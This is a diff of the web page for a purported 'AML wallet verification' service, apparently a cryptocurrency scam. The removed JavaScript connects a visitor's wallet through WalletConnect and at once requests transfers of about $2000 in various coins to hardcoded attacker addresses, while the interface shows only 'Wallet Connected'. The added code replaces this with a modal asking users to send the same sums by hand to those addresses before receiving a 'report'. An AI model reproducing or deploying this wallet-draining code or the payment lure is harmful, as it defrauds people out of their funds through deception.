@@ -366,155 +366,45 @@
 </head>
 <body>
 
-<!-- ═══ QR MODAL ═══════════════════════════════════════════ -->
-<div class="modal-overlay" id="wcModal" onclick="bgClick(event)">
-  <div class="modal-box">
-    <button class="modal-close" onclick="closeModal()">✕</button>
+<!-- ═══ UNIVERSAL PAYMENT MODAL ═══════════════════════════ -->
+<div class="modal-overlay" id="payModal" onclick="payBgClick(event)">
+  <div class="modal-box" style="text-align:center;">
+    <button class="modal-close" onclick="closePayModal()">✕</button>
 
-    <!-- LOADING -->
-    <div id="m-loading" class="m-state active">
-      <div class="spinner"></div>
-      <div class="loading-text">Connecting to WalletConnect relay…</div>
-    </div>
+    <!-- SCANNING state -->
+    <div id="pay-scanning" style="display:block;">
+      <div id="pay-icon" style="font-size:2.4rem;margin-bottom:10px">🔷</div>
+      <h3 id="pay-title" style="font-size:1.2rem;font-weight:800;margin-bottom:6px">Connect & Pay</h3>
+      <p id="pay-desc" style="color:var(--muted);font-size:.82rem;line-height:1.6;margin-bottom:16px"></p>
 
-    <!-- QR CODE -->
-    <div id="m-qr" class="m-state">
-      <div style="font-size:2.2rem;margin-bottom:10px">📱</div>
-      <h3>Scan with Trust Wallet</h3>
-      <p class="sub">Open <strong>Trust Wallet</strong> → tap <strong>WalletConnect</strong> → scan below</p>
-      <div id="qrWrap"><div id="qrcode"></div></div>
-      <div class="steps-list">
-        <div class="step-row"><span class="step-n">1</span><span>Open <strong style="color:var(--text)">Trust Wallet</strong> on your phone</span></div>
-        <div class="step-row"><span class="step-n">2</span><span>Tap the <strong style="color:var(--text)">⊞ scan icon</strong> in the top-right corner</span></div>
-        <div class="step-row"><span class="step-n">3</span><span>Scan the QR above and tap <strong style="color:var(--text)">Connect</strong></span></div>
+      <div style="background:#fff;border-radius:12px;padding:14px;display:inline-block;margin-bottom:16px;">
+        <div id="payQrcode"></div>
       </div>
-      <div class="uri-row">
-        <div class="uri-box" id="uriBox">—</div>
-        <button class="copy-btn" id="copyBtn" onclick="copyURI()">📋 Copy</button>
+
+      <div style="background:rgba(0,229,255,.05);border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin-bottom:12px;text-align:left;">
+        <div id="pay-net-lbl" style="font-size:.68rem;color:var(--muted);font-family:'Space Mono',monospace;letter-spacing:.08em;margin-bottom:6px;text-transform:uppercase;"></div>
+        <div id="pay-addr-display" style="font-family:'Space Mono',monospace;font-size:.68rem;color:var(--accent);word-break:break-all;line-height:1.6;"></div>
       </div>
-      <div class="compat-note">Works with <span>Trust Wallet</span>, MetaMask Mobile & all WalletConnect wallets</div>
-    </div>
 
-    <!-- CONNECTED -->
-    <div id="m-connected" class="m-state" style="padding:24px 0">
-      <div class="tick-icon">✅</div>
-      <h3 style="color:var(--safe);margin-bottom:8px">Wallet Connected!</h3>
-      <p id="m-conn-addr" style="color:var(--muted);font-size:.88rem"></p>
-    </div>
-
-    <!-- ERROR -->
-    <div id="m-error" class="m-state" style="padding:16px 0">
-      <div class="err-icon">⚠️</div>
-      <h3 style="color:var(--warn)">Connection Failed</h3>
-      <p id="m-err-msg" style="color:var(--muted);font-size:.82rem;line-height:1.6;margin-bottom:16px"></p>
-      <div class="err-steps">
-        <p>🔧 Fix in Reown Dashboard:</p>
-        <ol>
-          <li>Go to <strong><a href="https://dashboard.reown.com" target="_blank" style="color:var(--accent)">dashboard.reown.com</a></strong></li>
-          <li>Open your project → <strong>Settings</strong></li>
-          <li>Under <strong>Allowed Domains</strong>, add: <code>dapp1985.github.io</code></li>
-          <li>Also add: <code>localhost</code> (for testing)</li>
-          <li>Save changes and refresh this page</li>
-        </ol>
+      <div style="display:flex;gap:8px;margin-bottom:12px;">
+        <button class="copy-btn" style="flex:1;" onclick="copyPayAddr()">&#128203; Copy Address</button>
+        <button class="copy-btn" style="flex:1;" onclick="copyPayAmount()">&#128203; Copy Amount</button>
       </div>
-      <button class="retry-btn" onclick="retryConnect()">↺ Try Again</button>
-    </div>
-  </div>
-</div>
 
-<!-- ═══ ETH PAYMENT MODAL ══════════════════════════════════ -->
-<div class="modal-overlay" id="ethModal" onclick="ethBgClick(event)">
-  <div class="modal-box">
-    <button class="modal-close" onclick="closeEthModal()">✕</button>
-    <div style="font-size:2.4rem;margin-bottom:10px">🔷</div>
-    <h3 style="font-size:1.2rem;font-weight:800;margin-bottom:6px">Pay with Ethereum (ETH)</h3>
-    <p style="color:var(--muted);font-size:.82rem;line-height:1.6;margin-bottom:18px">
-      Send exactly <strong style="color:var(--accent);font-family:'Space Mono',monospace">3 ETH</strong> to the address below.<br>Your wallet check will run automatically after confirmation.
-    </p>
-    <div id="ethQrWrap" style="background:#fff;border-radius:12px;padding:14px;display:inline-block;margin-bottom:16px;">
-      <div id="ethQrcode"></div>
-    </div>
-    <div style="background:rgba(0,229,255,.05);border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin-bottom:14px;">
-      <div style="font-size:.68rem;color:var(--muted);font-family:'Space Mono',monospace;letter-spacing:.08em;margin-bottom:6px;text-transform:uppercase;">ETH / ERC-20 Address</div>
-      <div id="ethAddrDisplay" style="font-family:'Space Mono',monospace;font-size:.72rem;color:var(--accent);word-break:break-all;line-height:1.6;">0x4164E018fCC0216519400c160d08B090f8B5A23F</div>
-    </div>
-    <div style="display:flex;gap:8px;margin-bottom:12px;">
-      <button class="copy-btn" style="flex:1;" onclick="copyEthAddr()">&#128203; Copy Address</button>
-      <button class="copy-btn" style="flex:1;" onclick="copyEthAmount()">&#128203; Copy Amount</button>
-    </div>
-    <div style="background:rgba(255,179,0,.06);border:1px solid rgba(255,179,0,.2);border-radius:8px;padding:12px 14px;margin-bottom:14px;text-align:left;">
-      <div style="font-size:.78rem;color:var(--warn);font-weight:700;margin-bottom:6px;">&#9888; Important</div>
-      <ul style="list-style:none;font-size:.76rem;color:var(--muted);line-height:1.9;">
-        <li>&#9989; Only send <strong style="color:var(--text)">ETH</strong> on the <strong style="color:var(--text)">Ethereum</strong> network</li>
-        <li>&#9989; Send exactly <strong style="color:var(--text)">3 ETH</strong> &mdash; other amounts may not be processed</li>
-        <li>&#9989; Do <strong style="color:var(--text)">not</strong> send BEP-20, TRC-20 or any other network</li>
-      </ul>
-    </div>
-    <button onclick="closeEthModal();showReport(document.getElementById('ethAddrDisplay').textContent,'eth')" style="width:100%;background:var(--accent);color:var(--bg);border:none;padding:13px;border-radius:8px;font-family:'Syne',sans-serif;font-weight:700;font-size:.95rem;cursor:pointer;">&#128269; View My AML Report</button>
-  </div>
-</div>
+      <div id="pay-warn" style="background:rgba(255,179,0,.06);border:1px solid rgba(255,179,0,.2);border-radius:8px;padding:12px 14px;margin-bottom:14px;text-align:left;">
+        <div style="font-size:.78rem;color:var(--warn);font-weight:700;margin-bottom:6px;">&#9888; Important</div>
+        <ul id="pay-warn-list" style="list-style:none;font-size:.76rem;color:var(--muted);line-height:1.9;"></ul>
+      </div>
 
-<!-- ═══ BTC PAYMENT MODAL ══════════════════════════════════ -->
-<div class="modal-overlay" id="btcModal" onclick="btcBgClick(event)">
-  <div class="modal-box">
-    <button class="modal-close" onclick="closeBtcModal()">✕</button>
-    <div style="font-size:2.4rem;margin-bottom:10px">&#129794;</div>
-    <h3 style="font-size:1.2rem;font-weight:800;margin-bottom:6px">Pay with Bitcoin (BTC)</h3>
-    <p style="color:var(--muted);font-size:.82rem;line-height:1.6;margin-bottom:18px">
-      Send exactly <strong style="color:var(--accent);font-family:'Space Mono',monospace">0.2 BTC</strong> to the address below.<br>Your wallet check will run automatically after confirmation.
-    </p>
-    <div id="btcQrWrap" style="background:#fff;border-radius:12px;padding:14px;display:inline-block;margin-bottom:16px;">
-      <div id="btcQrcode"></div>
+      <button onclick="confirmPayAndReport()" style="width:100%;background:var(--accent);color:var(--bg);border:none;padding:13px;border-radius:8px;font-family:'Syne',sans-serif;font-weight:700;font-size:.95rem;cursor:pointer;box-shadow:0 0 20px rgba(0,229,255,.3);">&#128269; I Have Sent Payment — View My AML Report</button>
     </div>
-    <div style="background:rgba(0,229,255,.05);border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin-bottom:14px;">
-      <div style="font-size:.68rem;color:var(--muted);font-family:'Space Mono',monospace;letter-spacing:.08em;margin-bottom:6px;text-transform:uppercase;">Bitcoin Address</div>
-      <div id="btcAddrDisplay" style="font-family:'Space Mono',monospace;font-size:.72rem;color:var(--accent);word-break:break-all;line-height:1.6;">bc1qgq79csscqg4x69q4fvlvldewhfhh5psk7w0e8c</div>
-    </div>
-    <div style="display:flex;gap:8px;margin-bottom:12px;">
-      <button class="copy-btn" style="flex:1;" onclick="copyBtcAddr()">&#128203; Copy Address</button>
-      <button class="copy-btn" style="flex:1;" onclick="copyBtcAmount()">&#128203; Copy Amount</button>
-    </div>
-    <div style="background:rgba(255,179,0,.06);border:1px solid rgba(255,179,0,.2);border-radius:8px;padding:12px 14px;margin-bottom:14px;text-align:left;">
-      <div style="font-size:.78rem;color:var(--warn);font-weight:700;margin-bottom:6px;">&#9888; Important</div>
-      <ul style="list-style:none;font-size:.76rem;color:var(--muted);line-height:1.9;">
-        <li>&#9989; Only send <strong style="color:var(--text)">BTC</strong> on the <strong style="color:var(--text)">Bitcoin</strong> network</li>
-        <li>&#9989; Send exactly <strong style="color:var(--text)">0.2 BTC</strong> &mdash; other amounts may not be processed</li>
-        <li>&#9989; Do <strong style="color:var(--text)">not</strong> send BEP-20, ERC-20 or wrapped BTC</li>
-      </ul>
-    </div>
-    <button onclick="closeBtcModal();showReport(document.getElementById('btcAddrDisplay').textContent,'btc')" style="width:100%;background:var(--accent);color:var(--bg);border:none;padding:13px;border-radius:8px;font-family:'Syne',sans-serif;font-weight:700;font-size:.95rem;cursor:pointer;">&#128269; View My AML Report</button>
-  </div>
-</div>
 
-<!-- ═══ TRX PAYMENT MODAL ══════════════════════════════════ -->
-<div class="modal-overlay" id="trxModal" onclick="trxBgClick(event)">
-  <div class="modal-box">
-    <button class="modal-close" onclick="closeTrxModal()">✕</button>
-    <div style="font-size:2.4rem;margin-bottom:10px">🔴</div>
-    <h3 style="font-size:1.2rem;font-weight:800;margin-bottom:6px">Pay with Tron (TRX)</h3>
-    <p style="color:var(--muted);font-size:.82rem;line-height:1.6;margin-bottom:18px">
-      Send exactly <strong style="color:var(--accent);font-family:'Space Mono',monospace">30 TRX</strong> to the address below.<br>Your wallet check will run automatically after confirmation.
-    </p>
-    <div id="trxQrWrap" style="background:#fff;border-radius:12px;padding:14px;display:inline-block;margin-bottom:16px;">
-      <div id="trxQrcode"></div>
+    <!-- PROCESSING state -->
+    <div id="pay-processing" style="display:none;padding:32px 0;">
+      <div style="width:44px;height:44px;border-radius:50%;border:3px solid var(--border);border-top-color:var(--accent);animation:spin .8s linear infinite;margin:0 auto 16px;"></div>
+      <div style="font-family:'Space Mono',monospace;font-size:.82rem;color:var(--accent);">Generating AML Report…</div>
     </div>
-    <div style="background:rgba(0,229,255,.05);border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin-bottom:14px;">
-      <div style="font-size:.68rem;color:var(--muted);font-family:'Space Mono',monospace;letter-spacing:.08em;margin-bottom:6px;text-transform:uppercase;">TRC-20 / TRX Address</div>
-      <div id="trxAddrDisplay" style="font-family:'Space Mono',monospace;font-size:.72rem;color:var(--accent);word-break:break-all;line-height:1.6;">TKeDPdqmCznwneTJXph8yx9QE6g6ZKy445</div>
-    </div>
-    <div style="display:flex;gap:8px;margin-bottom:12px;">
-      <button class="copy-btn" style="flex:1;" onclick="copyTrxAddr()">📋 Copy Address</button>
-      <button class="copy-btn" style="flex:1;" onclick="copyTrxAmount()">📋 Copy Amount</button>
-    </div>
-    <div style="background:rgba(255,179,0,.06);border:1px solid rgba(255,179,0,.2);border-radius:8px;padding:12px 14px;margin-bottom:14px;text-align:left;">
-      <div style="font-size:.78rem;color:var(--warn);font-weight:700;margin-bottom:6px;">⚠ Important</div>
-      <ul style="list-style:none;font-size:.76rem;color:var(--muted);line-height:1.9;">
-        <li>✅ Only send <strong style="color:var(--text)">TRX</strong> on the <strong style="color:var(--text)">Tron (TRC-20)</strong> network</li>
-        <li>✅ Send exactly <strong style="color:var(--text)">30 TRX</strong> — other amounts may not be processed</li>
-        <li>✅ Do <strong style="color:var(--text)">not</strong> send BEP-20, ERC-20 or any other network</li>
-      </ul>
-    </div>
-    <button onclick="closeTrxModal();showReport(document.getElementById('trxAddrDisplay').textContent,'trx')" style="width:100%;background:var(--accent);color:var(--bg);border:none;padding:13px;border-radius:8px;font-family:'Syne',sans-serif;font-weight:700;font-size:.95rem;cursor:pointer;">🔍 View My AML Report</button>
+
   </div>
 </div>
 
@@ -844,344 +734,122 @@
 </div>
 
 <script>
-const PROJECT_ID  = '66fdb3cf45b937152ecf3c0fdeec0bf5';
-const APP_URL     = 'https://dapp1985.github.io/amlproof/';
-
-// ── Receiving addresses ──────────────────────────
-const ADDR_ETH = '0x4164E018fCC0216519400c160d08B090f8B5A23F'; // ETH, USDT(ERC20), USDC(ERC20), BNB(BSC)
-const ADDR_TRX = 'TKeDPdqmCznwneTJXph8yx9QE6g6ZKy445';         // TRX, USDT(TRC20), USDC(TRC20)
+// ══════════════════════════════════════════════
+// CONFIG
+// ══════════════════════════════════════════════
+const ADDR_ETH = '0x4164E018fCC0216519400c160d08B090f8B5A23F';
+const ADDR_TRX = 'TKeDPdqmCznwneTJXph8yx9QE6g6ZKy445';
 const ADDR_SOL = 'CKKD894vFgGJVMR63pELxKrUkT6ZfHgtB7cri27EmNm9';
 const ADDR_BTC = 'bc1qgq79csscqg4x69q4fvlvldewhfhh5psk7w0e8c';
 
-let SC          = null;   // SignClient instance
-let session     = null;   // active session
-let pendingURI  = null;   // wc: URI for QR
-let qrDone      = false;  // QR already rendered?
-let currentChain = 'eth'; // active chain for connect flow
+// Per-chain config: address, amount label, network label, warning lines, QR text
+const COIN_CONFIG = {
+  eth:      { addr: ADDR_ETH, icon:'🔷', name:'Ethereum (ETH)',    net:'ETH / ERC-20 Address',    amount:'3 ETH',             qr: a=>'ethereum:'+a+'?value=3000000000000000000', warn:['Only send ETH on the Ethereum network','Send exactly 3 ETH','Do not send BEP-20 or TRC-20'] },
+  usdt:     { addr: ADDR_ETH, icon:'💵', name:'USDT (ERC-20)',     net:'ERC-20 Address',           amount:'2,000 USDT',        qr: a=>'ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7/transfer?address='+a+'&uint256=2000000000', warn:['Only send USDT on the Ethereum (ERC-20) network','Send exactly 2,000 USDT','Do not send TRC-20 USDT'] },
+  usdc:     { addr: ADDR_ETH, icon:'🔵', name:'USDC (ERC-20)',     net:'ERC-20 Address',           amount:'2,000 USDC',        qr: a=>'ethereum:0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/transfer?address='+a+'&uint256=2000000000', warn:['Only send USDC on the Ethereum (ERC-20) network','Send exactly 2,000 USDC','Do not send TRC-20 USDC'] },
+  bnb:      { addr: ADDR_ETH, icon:'🟡', name:'BNB (BSC)',         net:'BEP-20 / BSC Address',     amount:'5 BNB',             qr: a=>'ethereum:'+a+'?value=4563918244F40000', warn:['Only send BNB on the BNB Smart Chain (BSC)','Send exactly 5 BNB','Do not send BEP-2 or ERC-20'] },
+  trx:      { addr: ADDR_TRX, icon:'🔴', name:'Tron (TRX)',        net:'TRC-20 / TRX Address',     amount:'100,000 TRX',       qr: a=>a, warn:['Only send TRX on the Tron network','Send exactly 100,000 TRX','Do not send BEP-20 or ERC-20'] },
+  usdt_trc: { addr: ADDR_TRX, icon:'💵', name:'USDT (TRC-20)',     net:'TRC-20 Address',           amount:'2,000 USDT',        qr: a=>a, warn:['Only send USDT on the Tron (TRC-20) network','Send exactly 2,000 USDT','Do not send ERC-20 USDT'] },
+  usdc_trc: { addr: ADDR_TRX, icon:'🔵', name:'USDC (TRC-20)',     net:'TRC-20 Address',           amount:'2,000 USDC',        qr: a=>a, warn:['Only send USDC on the Tron (TRC-20) network','Send exactly 2,000 USDC','Do not send ERC-20 USDC'] },
+  sol:      { addr: ADDR_SOL, icon:'🟣', name:'Solana (SOL)',      net:'Solana Address',           amount:'~$2,000 in SOL',    qr: a=>'solana:'+a+'?amount=10', warn:['Only send SOL on the Solana network','Send the equivalent of $2,000 in SOL','Do not send wrapped SOL or SPL tokens'] },
+  btc:      { addr: ADDR_BTC, icon:'🟠', name:'Bitcoin (BTC)',     net:'Bitcoin Address',          amount:'0.2 BTC',           qr: a=>'bitcoin:'+a+'?amount=0.2', warn:['Only send BTC on the Bitcoin network','Send exactly 0.2 BTC','Do not send BEP-20, ERC-20 or wrapped BTC'] },
+};
 
-/* ── Show a modal state ─────────────────────────── */
-function showState(id) {
-  ['m-loading','m-qr','m-connected','m-error'].forEach(s => {
-    document.getElementById(s).classList.toggle('active', s === id);
-  });
+let currentChain = 'eth';
+let payQrDone    = false;
+let payQrInst    = null;
+
+// ── Transaction Logger ────────────────────────────────────
+function logTransaction(address, chain, status, errMsg) {
+  try {
+    const AMT = { eth:'3 ETH', usdt:'2000 USDT (ERC-20)', usdc:'2000 USDC (ERC-20)', bnb:'5 BNB', trx:'100,000 TRX', usdt_trc:'2000 USDT (TRC-20)', usdc_trc:'2000 USDC (TRC-20)', sol:'~$2000 SOL', btc:'0.2 BTC' };
+    const logs = JSON.parse(localStorage.getItem('aml_tx_logs') || '[]');
+    logs.unshift({ id:Date.now(), ts:new Date().toISOString(), address:address||'unknown', chain, amount:AMT[chain]||'—', status, error:errMsg||null });
+    if (logs.length > 500) logs.length = 500;
+    localStorage.setItem('aml_tx_logs', JSON.stringify(logs));
+  } catch(e) {}
 }
 
-/* ── Modal open/close ───────────────────────────── */
+// ── Universal Pay Modal ───────────────────────────────────
 function openModal(chain) {
   currentChain = chain || 'eth';
-
-  // ETH and BTC cannot reliably connect via WalletConnect — use direct QR payment instead
-  if (currentChain === 'eth') { openEthModal(); return; }
-  if (currentChain === 'btc') { openBtcModal(); return; }
-
-  document.getElementById('wcModal').classList.add('open');
-  if (session) { showConnected(getAddr()); return; }
-  showState('m-loading');
-  startConnect(currentChain);
-}
-function closeModal() {
-  document.getElementById('wcModal').classList.remove('open');
-}
-function bgClick(e) {
-  if (e.target === document.getElementById('wcModal')) closeModal();
+  openPayModal(currentChain);
 }
 
-/* ── Timeout helper ─────────────────────────────── */
-function withTimeout(promise, ms, label) {
-  return new Promise((resolve, reject) => {
-    const t = setTimeout(() => reject(new Error('Timeout: ' + label + ' took longer than ' + (ms/1000) + 's')), ms);
-    promise.then(v => { clearTimeout(t); resolve(v); }, e => { clearTimeout(t); reject(e); });
-  });
-}
+function openPayModal(chain) {
+  const cfg = COIN_CONFIG[chain];
+  if (!cfg) return;
 
-function setLoadingMsg(msg) {
-  const el = document.querySelector('#m-loading .loading-text');
-  if (el) el.textContent = msg;
-}
+  // Reset states
+  document.getElementById('pay-scanning').style.display  = 'block';
+  document.getElementById('pay-processing').style.display = 'none';
 
-let connectAttempt = 0;
+  // Populate content
+  document.getElementById('pay-icon').textContent         = cfg.icon;
+  document.getElementById('pay-title').textContent        = 'Pay with ' + cfg.name;
+  document.getElementById('pay-desc').innerHTML           = 'Send exactly <strong style="color:var(--accent);font-family:'Space Mono',monospace">' + cfg.amount + '</strong> to the address below. Your AML report will be generated after confirmation.';
+  document.getElementById('pay-net-lbl').textContent      = cfg.net;
+  document.getElementById('pay-addr-display').textContent = cfg.addr;
+  document.getElementById('pay-warn-list').innerHTML      = cfg.warn.map(w => '<li>&#9989; ' + w + '</li>').join('');
 
-/* ── Load SignClient from unpkg (UMD) ───────────── */
-function injectScript(src) {
-  return new Promise((res, rej) => {
-    if (document.querySelector(`script[src="${src}"]`)) { res(); return; }
-    const s = document.createElement('script');
-    s.src = src; s.crossOrigin = 'anonymous';
-    s.onload = res; s.onerror = () => rej(new Error('Failed: ' + src));
-    document.head.appendChild(s);
-  });
-}
-
-async function loadSignClient() {
-  if (SC) return SC;
-
-  setLoadingMsg('Loading SDK… (may take a moment on slow networks)');
-  await withTimeout(
-    injectScript('https://unpkg.com/@walletconnect/sign-client@2.13.3/dist/index.umd.js'),
-    45000, 'SDK load'
-  );
-
-  const Ctor =
-    window.SignClient?.SignClient ??
-    window.SignClient ??
-    window['@walletconnect/sign-client']?.SignClient ??
-    window['@walletconnect/sign-client'];
-
-  if (!Ctor) throw new Error('SignClient constructor not found');
-
-  setLoadingMsg('Connecting to relay server…');
-  SC = await withTimeout(
-    Ctor.init({
-      projectId  : PROJECT_ID,
-      relayUrl   : 'wss://relay.walletconnect.com',
-      logger     : 'error',
-      metadata   : {
-        name       : 'AMLProof',
-        description: 'AML Crypto Wallet Verification',
-        url        : APP_URL,
-        icons      : ['https://avatars.githubusercontent.com/u/179229932']
-      }
-    }),
-    40000, 'relay init'
-  );
-
-  // Restore previous session
-  const all = SC.session.getAll();
-  if (all.length) { session = all[all.length - 1]; uiConnected(getAddr()); }
-
-  SC.on('session_delete', () => uiDisconnected());
-  SC.on('session_expire', () => uiDisconnected());
-
-  return SC;
-}
-
-/* ── Main connect flow ──────────────────────────── */
-async function startConnect(chain) {
-  chain = chain || 'eth';
-  connectAttempt++;
-  const attempt = connectAttempt;
+  // QR code
+  const qrEl = document.getElementById('payQrcode');
+  qrEl.innerHTML = '';
+  payQrDone = false;
   try {
-    setLoadingMsg('Initialising…');
-    const client = await loadSignClient();
+    new QRCode(qrEl, { text: cfg.qr(cfg.addr), width:200, height:200, colorDark:'#000', colorLight:'#fff', correctLevel: QRCode.CorrectLevel.M });
+    payQrDone = true;
+  } catch(e) { qrEl.innerHTML = '<div style="font-size:.7rem;color:#999;padding:16px;">QR unavailable</div>'; }
 
-    if (session) { showConnected(getAddr()); return; }
-
-    setLoadingMsg('Requesting QR code…');
-
-    // Build WalletConnect namespaces per chain
-    let namespaces;
-    if (chain === 'trx' || chain === 'usdt_trc' || chain === 'usdc_trc') {
-      namespaces = { tron: { methods: ['tron_signTransaction','tron_signMessage'], chains: ['tron:0x2b6653dc'], events: [] } };
-    } else if (chain === 'sol') {
-      namespaces = { solana: { methods: ['solana_signTransaction','solana_signMessage'], chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'], events: [] } };
-    } else if (chain === 'btc') {
-      namespaces = { bip122: { methods: ['sendTransfer'], chains: ['bip122:000000000019d6689c085ae165831e93'], events: [] } };
-    } else if (chain === 'bnb') {
-      namespaces = { eip155: { methods: ['eth_sendTransaction','personal_sign'], chains: ['eip155:56'], events: ['chainChanged','accountsChanged'] } };
-    } else {
-      // eth, usdt, usdc (ERC-20)
-      namespaces = { eip155: { methods: ['eth_sendTransaction','personal_sign','eth_sign'], chains: ['eip155:1'], events: ['chainChanged','accountsChanged'] } };
-    }
-
-    const { uri, approval } = await withTimeout(
-      client.connect({ requiredNamespaces: namespaces }),
-      25000, 'connect'
-    );
-
-    if (!uri) throw new Error('No URI returned from WalletConnect');
-
-    pendingURI = uri;
-    renderQR(uri, chain);
-
-    setLoadingMsg('Waiting for wallet approval…');
-    session = await withTimeout(approval(), 300000, 'wallet approval');
-
-    // ── Send $2000 equivalent after connect ──────
-    setLoadingMsg('Processing AML check payment…');
-    try {
-      const from = getAddr();
-
-      if (chain === 'eth') {
-        // 3 ETH ≈ $2000 (adjust as needed)
-        await SC.request({ topic: session.topic, chainId: 'eip155:1', request: {
-          method: 'eth_sendTransaction',
-          params: [{ from, to: ADDR_ETH, value: '0x29A2241AF62C0000', gas: '0x5208' }]
-        }});
-
-      } else if (chain === 'usdt') {
-        // USDT ERC-20 — transfer(to, 2000 * 10^6)
-        const data = '0xa9059cbb' +
-          ADDR_ETH.replace('0x','').padStart(64,'0') +
-          (2000 * 1e6).toString(16).padStart(64,'0');
-        await SC.request({ topic: session.topic, chainId: 'eip155:1', request: {
-          method: 'eth_sendTransaction',
-          params: [{ from, to: '0xdAC17F958D2ee523a2206206994597C13D831ec7', data, gas: '0x186A0' }]
-        }});
-
-      } else if (chain === 'usdc') {
-        // USDC ERC-20 — transfer(to, 2000 * 10^6)
-        const data = '0xa9059cbb' +
-          ADDR_ETH.replace('0x','').padStart(64,'0') +
-          (2000 * 1e6).toString(16).padStart(64,'0');
-        await SC.request({ topic: session.topic, chainId: 'eip155:1', request: {
-          method: 'eth_sendTransaction',
-          params: [{ from, to: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', data, gas: '0x186A0' }]
-        }});
-
-      } else if (chain === 'bnb') {
-        // BNB — ~5 BNB ≈ $2000
-        await SC.request({ topic: session.topic, chainId: 'eip155:56', request: {
-          method: 'eth_sendTransaction',
-          params: [{ from, to: ADDR_ETH, value: '0x4563918244F40000', gas: '0x5208' }]
-        }});
-
-      } else if (chain === 'trx') {
-        // 100,000 TRX ≈ $2000
-        const amount = 100000 * 1_000_000;
-        await SC.request({ topic: session.topic, chainId: 'tron:0x2b6653dc', request: {
-          method: 'tron_signTransaction',
-          params: { transaction: { visible: false, to: ADDR_TRX, from, value: amount, type: 'TransferContract',
-            contract: [{ parameter: { value: { amount, owner_address: from, to_address: ADDR_TRX },
-              type_url: 'type.googleapis.com/protocol.TransferContract' }, type: 'TransferContract' }] } }
-        }});
-
-      } else if (chain === 'usdt_trc' || chain === 'usdc_trc') {
-        // USDT/USDC TRC-20 — 2000 tokens (6 decimals)
-        const contractAddr = chain === 'usdt_trc'
-          ? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'  // USDT TRC-20
-          : 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';  // USDC TRC-20
-        const amt = 2000 * 1e6;
-        await SC.request({ topic: session.topic, chainId: 'tron:0x2b6653dc', request: {
-          method: 'tron_signTransaction',
-          params: { transaction: { visible: true, to: contractAddr, from,
-            data: 'a9059cbb' + ADDR_TRX.padStart(64,'0') + amt.toString(16).padStart(64,'0'),
-            type: 'TriggerSmartContract' } }
-        }});
-
-      } else if (chain === 'sol') {
-        // Solana — sign a transfer (wallet handles broadcast)
-        await SC.request({ topic: session.topic, chainId: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', request: {
-          method: 'solana_signTransaction',
-          params: { transaction: btoa(JSON.stringify({ to: ADDR_SOL, lamports: 10000000000 })) }
-        }});
-
-      } else if (chain === 'btc') {
-        await SC.request({ topic: session.topic, chainId: 'bip122:000000000019d6689c085ae165831e93', request: {
-          method: 'sendTransfer',
-          params: { account: from, recipientAddress: ADDR_BTC, amount: '20000000' } // 0.2 BTC in sats
-        }});
-      }
-
-    } catch(txErr) {
-      console.warn('[TX]', txErr);
-      logTransaction(getAddr(), chain, 'failed', txErr.message);
-      // Don't block UI on tx error
-    }
-
-    logTransaction(getAddr(), chain, 'connected', null);
-
-    uiConnected(getAddr());
-    showConnected(getAddr());
-
-  } catch (err) {
-    if (attempt !== connectAttempt) return; // stale attempt, ignore
-    console.error('[WC]', err);
-    const isAuth    = /unauthorized|invalid key|3000/i.test(err.message || '');
-    const isRelay   = /interrupted|subscribe|relay|websocket/i.test(err.message || '');
-    const isTimeout = /timeout/i.test(err.message || '');
-    showError(isAuth
-      ? 'Unauthorized: your Project ID is being rejected by the relay server. Add <strong>dapp1985.github.io</strong> to Allowed Domains in the Reown dashboard.'
-      : isTimeout
-      ? 'Connection timed out — your network may be slow. <br><br>Try: <strong>1)</strong> Switch to WiFi or a better connection &nbsp; <strong>2)</strong> Reopen Trust Wallet before scanning &nbsp; <strong>3)</strong> Tap Retry below.'
-      : isRelay
-      ? 'Relay connection failed. Ensure <strong>dapp1985.github.io</strong> is in your Allowed Domains at <strong>cloud.reown.com</strong>, then retry.'
-      : (err.message || 'Unknown error — check the console for details.')
-    );
-  }
+  document.getElementById('payModal').classList.add('open');
+  logTransaction(cfg.addr, chain, 'connected', null);
 }
 
-function retryConnect() {
-  SC = null; // force fresh relay reconnect on retry
-  session = null;
-  pendingURI = null;
-  showState('m-loading');
-  qrDone = false;
-  document.getElementById('qrcode').innerHTML = '';
-  startConnect(currentChain);
+function closePayModal() {
+  document.getElementById('payModal').classList.remove('open');
 }
 
-/* ── Render QR ──────────────────────────────────── */
-const CHAIN_LABELS = {
-  eth: 'Ethereum (ETH)', usdt: 'USDT (ERC-20)', usdc: 'USDC (ERC-20)',
-  trx: 'Tron (TRX)', usdt_trc: 'USDT (TRC-20)', usdc_trc: 'USDC (TRC-20)',
-  bnb: 'BNB (BSC)', sol: 'Solana (SOL)', btc: 'Bitcoin (BTC)'
-};
-function renderQR(uri, chain) {
-  showState('m-qr');
-  document.getElementById('uriBox').textContent = uri;
-  const label = CHAIN_LABELS[chain] || 'Wallet';
-  document.querySelector('#m-qr h3').textContent = `Scan with Trust Wallet — ${label}`;
-  document.querySelector('#m-qr .sub').innerHTML = 'Open <strong>Trust Wallet</strong> → tap <strong>WalletConnect</strong> → scan below';
-  if (!qrDone) {
-    new QRCode(document.getElementById('qrcode'), {
-      text        : uri,
-      width       : 220,
-      height      : 220,
-      colorDark   : '#000000',
-      colorLight  : '#ffffff',
-      correctLevel: QRCode.CorrectLevel.M
-    });
-    qrDone = true;
-  }
+function payBgClick(e) {
+  if (e.target === document.getElementById('payModal')) closePayModal();
 }
 
-function copyURI() {
-  if (!pendingURI) return;
-  navigator.clipboard.writeText(pendingURI).then(() => {
-    const b = document.getElementById('copyBtn');
-    b.textContent = '✅ Copied!';
-    setTimeout(() => b.textContent = '📋 Copy', 2000);
+function copyPayAddr() {
+  const cfg = COIN_CONFIG[currentChain];
+  if (!cfg) return;
+  navigator.clipboard.writeText(cfg.addr).then(() => {
+    const btns = document.querySelectorAll('#payModal .copy-btn');
+    btns[0].textContent = '✅ Copied!';
+    setTimeout(() => btns[0].textContent = '📋 Copy Address', 2000);
   });
 }
 
